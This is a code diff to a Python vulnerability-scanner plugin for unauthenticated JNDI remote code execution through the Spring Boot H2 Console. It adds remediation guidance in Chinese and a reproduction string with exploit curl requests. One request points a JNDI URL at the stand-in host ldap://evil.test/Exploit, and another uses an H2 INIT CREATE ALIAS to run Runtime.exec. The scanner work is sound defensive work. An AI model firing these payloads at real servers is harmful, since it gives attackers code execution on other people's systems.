@@ -14,11 +14,49 @@ H2_MARKER = 'spring-h2-console-rce-confirmed'
 
 class SpringH2ConsoleRcePlugin(PluginBase):
     name = 'Spring Boot Actuator H2 Console 未授权 JNDI RCE'
-    cve = ''
+    cve = 'N/A'
     severity = 'high'
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
     category = 'vuln'
     description = 'H2 Console 可匿名访问，通过 JNDI 连接字符串执行任意代码（影响 H2 + Actuator）'
     fix = '为 /h2-console 配置认证；禁用 H2 Console 生产环境；移除 H2 依赖改用生产级数据库'
+    fix_detail = (
+        '【配置加固】application.yml 生产环境禁用 H2 Console：\n'
+        '  spring.h2.console.enabled: false  # 禁用 H2 Console\n'
+        '  spring.h2.console.path: /h2-console  # 若必须启用，修改默认路径\n'
+        '【移除依赖】pom.xml 删除 H2 数据库依赖，改用生产级数据库：\n'
+        '  <dependency><groupId>com.h2database</groupId><artifactId>h2</artifactId><scope>test</scope></dependency>\n'
+        '  改用 MySQL / PostgreSQL / Oracle 等生产级数据库\n'
+        '【SecurityConfig】为 /h2-console 配置认证与内网限制：\n'
+        '  .antMatchers("/h2-console/**").hasRole("ADMIN")\n'
+        '【JVM 加固】JVM 启动参数禁用远程类加载（缓解 JNDI 注入）：\n'
+        '  -Dcom.sun.jndi.ldap.object.trustURLCodebase=false\n'
+        '  -Dcom.sun.jndi.rmi.object.trustURLCodebase=false\n'
+        '【WAF 规则】拦截外网对 /h2-console 的访问\n'
+        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制'
+    )
+    reproduce = (
+        '# 1. 探测 H2 Console 端点可达性：\n'
+        'curl -i "http://target/h2-console"\n'
+        '  # 返回 200 + HTML 含 <title>H2 Console</title> 即 H2 Console 暴露\n'
+        '\n'
+        '# 2. 通过 JNDI 连接字符串触发 RCE（PoC，请勿对未授权目标使用）：\n'
+        'curl -X POST "http://target/h2-console/" \\\n'
+        '  -d "language=en" \\\n'
+        '  -d "setting=Generic+H2+(Embedded)" \\\n'
+        '  -d "name=Generic+H2+(Embedded)" \\\n'
+        '  -d "driver=javax.naming.InitialContext" \\\n'
+        '  -d "url=ldap://evil.test/Exploit"\n'
+        '\n'
+        '# 3. 利用 H2 INIT 命令执行（CREATE ALIAS 调用 Runtime）：\n'
+        'curl -X POST "http://target/h2-console/" \\\n'
+        '  -d "driver=org.h2.Driver" \\\n'
+        '  -d "url=jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS \'String x(String c) throws Exception {Runtime.getRuntime().exec(c);return 1;}\'\\;CALL EXEC(\'id\')"\n'
+        '\n'
+        '# 预期响应：/h2-console 返回 200 + H2 Console 页面即漏洞存在'
+    )
 
     def verify(self, target, session):
         url = join_url(target, '/h2-console')
